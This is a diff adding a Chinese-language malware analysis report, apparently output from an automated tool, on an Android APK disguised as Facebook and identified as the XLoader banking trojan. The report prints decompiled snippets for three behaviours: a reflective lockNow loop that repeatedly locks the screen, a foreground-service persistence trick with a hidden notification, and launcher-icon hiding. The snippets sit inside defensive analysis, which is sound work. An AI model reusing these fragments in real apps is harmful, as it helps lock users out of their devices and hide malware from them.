@@ -1,0 +1,118 @@
+{
+  "APK信息": {
+    "文件名": "e690c05f2ab668a661cd219e324291819d5f5646775c2a17f3b3a03e79332a04.apk",
+    "sha256": "e690c05f2ab668a661cd219e324291819d5f5646775c2a17f3b3a03e79332a04",
+    "包名": "tryrt.sdf.bfd",
+    "应用名": "Facebook",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 182.5
+  },
+  "行为列表": [
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "device_lock",
+          "中文名": "设备锁屏",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "lockNow"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\a;",
+          "method_signature": "if(i2 >= 70)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "while (true) { int i2 = i; if (i2 >= 70) { return; } systemService.getClass().getMethod(\"lockNow\", new Class[0]).invoke(systemService, new Object[0]); Thread.sleep(99L); i = i2 + 1; }",
+          "malicious_code_snippet_context": "while (true) { int i2 = i; if (i2 >= 70) { return; } systemService.getClass().getMethod(\"lockNow\", new Class[0]).invoke(systemService, new Object[0]); Thread.sleep(99L); i = i2 + 1; }",
+          "behavior_description": "该代码在子线程中循环70次，每次通过Java反射机制调用系统服务（DevicePolicyManager）的lockNow()方法立即锁定设备屏幕，每次间隔99毫秒。这种高频反复锁屏手法是典型的勒索软件设备锁定行为，在约7秒内连续锁屏70次，使用户无法正常操作设备，通常配合勒索信息迫使受害者支付赎金。使用反射（getMethod(\"lockNow\")）而非直接调用，目的是规避静态分析检测。数据流向：获取DevicePolicyManager系统服务实例→反射调用lockNow()反复强制锁定屏幕。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "persistence",
+      "中文名": "持久化",
+      "MITRE": "T1444",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "foreground_service",
+          "中文名": "前台服务保活",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "startForeground"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\ddgod\\dgMainService;",
+          "method_signature": "if(Build.VERSION.SDK_INT < 18)",
+          "malicious_behavior": "persistence",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT < 18) {\n    startForeground(a, new Notification());\n    return;\n}\nNotification.Builder builder = new Notification.Builder(this);\nbuilder.setContentTitle(\"KeepAppAlive\");\nbuilder.setContentText(\"DaemonService is runing...\");\nstartForeground(a, builder.build());\nstartService(new Intent(this, gdCancelNoticeService.class));",
+          "malicious_code_snippet_context": "          super.onCreate();\n          SharedPreferences sharedPreferences = getSharedPreferences(\"pref\", 0);\n          sharedPreferences.edit().putInt(\"create\", sharedPreferences.getInt(\"create\", 0) + 1).apply();\n>>>         if (Build.VERSION.SDK_INT < 18) {\n>>>             startForeground(a, new Notification());\n>>>             return;\n>>>         }\n>>>         Notification.Builder builder = new Notification.Builder(this);\n>>>         builder.setSmallIcon(R.mipmap.icon);\n>>>         builder.setContentTitle(\"KeepAppAlive\");\n>>>         builder.setContentText(\"DaemonService is runing...\");\n>>>         startForeground(a, builder.build());\n          startService(new Intent(this, (Class<?>) gdCancelNoticeService.class));\n      }\n  ",
+          "behavior_description": "该代码位于恶意样本（XLoader 间谍/银行木马）的服务组件 dgMainService 的 onCreate() 中，实现典型的'前台服务守护保活'机制：当系统版本低于 Android 4.3（SDK 18）时，直接以空 Notification 调用 startForeground() 将自身提升为前台服务，用户完全无感知；当版本大于等于 4.3 时，先构造标题为 KeepAppAlive、内容为 DaemonService is runing... 的通知调用 startForeground() 获得前台进程优先级，随后启动伴生服务 gdCancelNoticeService 来移除通知栏图标，从而在规避系统内存回收/查杀的同时对用户隐身。数据流向：Build.VERSION.SDK_INT（系统版本检测）→ 分支选择隐蔽保活策略 → startForeground()（前台服务保活）+ startService()（启动通知取消服务）。该机制确保木马服务进程持续存活，为其后台窃密与 C2 通信提供持久化保障，属于恶意软件的持久化驻留行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\sbddl\\gdsActivity;",
+          "method_signature": "run()",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "gdsActivity.this.getPackageManager().setComponentEnabledSetting(new ComponentName(gdsActivity.this.getPackageName(), gdsActivity.class.getName()), 2, 1);",
+          "malicious_code_snippet_context": "              @Override // java.lang.Runnable\n              public void run() {\n                  try {\n>>>                     gdsActivity.this.getPackageManager().setComponentEnabledSetting(new ComponentName(gdsActivity.this.getPackageName(), gdsActivity.class.getName()), 2, 1);\n                  } catch (Exception e) {\n                      e.printStackTrace();\n                  }",
+          "behavior_description": "在 gdsActivity 的 onCreate 中通过匿名 Runnable 立即执行图标隐藏：调用 PackageManager.setComponentEnabledSetting() 将自身启动 Activity 组件设置为 COMPONENT_ENABLED_STATE_DISABLED（参数 2），并附带 DONT_KILL_APP 标志（参数 1），使应用图标从桌面启动器中消失且进程不被杀死。数据流向：getPackageName() 与 gdsActivity.class.getName() 获取自身组件标识 → setComponentEnabledSetting(..., 2, 1) 禁用该启动组件，实现图标隐藏。该手法与厂商报告确认的 XLoader（ANDROIDOS_XLOADER.HRX）银行木马/间谍软件伪装成 Facebook/Chrome 后隐蔽驻留的行为一致，用户无法在桌面找到并卸载该恶意应用，为后续短信窃取、银行欺诈等恶意模块提供持久隐蔽环境。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
